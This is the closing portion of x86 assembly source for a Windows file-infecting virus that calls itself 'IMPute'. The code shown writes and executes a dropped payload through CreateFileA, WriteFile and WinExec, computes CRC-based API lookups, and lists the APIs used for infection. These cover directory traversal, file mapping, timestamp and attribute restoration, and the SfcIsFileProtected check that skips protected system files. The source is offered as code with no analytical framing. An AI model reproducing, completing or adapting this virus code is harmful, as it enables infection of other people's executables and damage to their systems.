        mov     edx, edi
        sub     esi, offset import_list - offset impute_inf

init_code       label   near
if use_b8c2 or use_bbc2
        xor     eax, eax
        lods    byte ptr [esi]
else
        movzx   eax, byte ptr [esi + 1]
endif
        xlat    byte ptr [ebx]
        add     eax, 80000000h + exesize + offset import_list - offset impute_imp
        stos    dword ptr [edi]
        xor     eax, eax
        lods    byte ptr [esi]
        inc     bh
        xlat    byte ptr [ebx]
        dec     bh
        add     eax, 80000100h + exesize + offset import_list - offset impute_imp
        stos    dword ptr [edi]
ife (use_b8c2 or use_bbc2)
        inc     esi
endif
        loop    init_code
        leave
        pop     ebx
        call    dword ptr [ebx + dllcrcstk.dCreateFileA]
        push    eax
        xchg    ebp, eax
        call    dword ptr [ebx + dllcrcstk.dWriteFile]
        push    ebp
        call    dword ptr [ebx + dllcrcstk.dCloseHandle]
        call    dword ptr [ebx + dllcrcstk.dGlobalFree]
        call    dword ptr [ebx + dllcrcstk.dWinExec]
        lea     esp, dword ptr [ebx + size dllcrcstk]
        popad
        ret

align 2
impute_codeend  label   near
align
impute_execode  endp
impute_inf      endp

create_crcs     proc    near
        or      eax, -1

create_outer    label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

create_inner    label   near
        add     eax, eax
        jnb     create_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

create_skip     label   near
        loop    create_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      create_outer
        stos    dword ptr [edi]
        dec     edx
        jne     create_crcs
        ret
create_crcs     endp

do_message      label   near
        xor     ebx, ebx
        push    ebx
        push    offset txttitle
        push    offset txtbody
        push    ebx
        call    MessageBoxA
        push    ebx
        call    ExitProcess

;must be alphabetical order
;API names are not present in replications, only in dropper

krnnames        db      "CloseHandle"         , 0
                db      "CreateFileMappingA"  , 0
                db      "CreateFileW"         , 0
                db      "FindClose"           , 0
                db      "FindFirstFileW"      , 0
                db      "FindNextFileW"       , 0
                db      "GetFullPathNameW"    , 0
                db      "GetTickCount"        , 0
                db      "GlobalAlloc"         , 0
                db      "GlobalFree"          , 0
                db      "LoadLibraryA"        , 0
                db      "MapViewOfFile"       , 0
                db      "SetCurrentDirectoryA", 0
                db      "SetCurrentDirectoryW", 0
                db      "SetFileAttributesW"  , 0
                db      "SetFileTime"         , 0
                db      "UnmapViewOfFile"     , 0

sfcnames        db      "SfcIsFileProtected", 0

dllnames        db      "CloseHandle" , 0
                db      "CreateFileA" , 0
                db      "GetTickCount", 0
                db      "GlobalAlloc" , 0
                db      "GlobalFree"  , 0
                db      "WinExec"     , 0
                db      "WriteFile"   , 0

txttitle        db      "IMPute", 0
txtbody         db      "running...", 0

.code
                db      ?
end             dropper
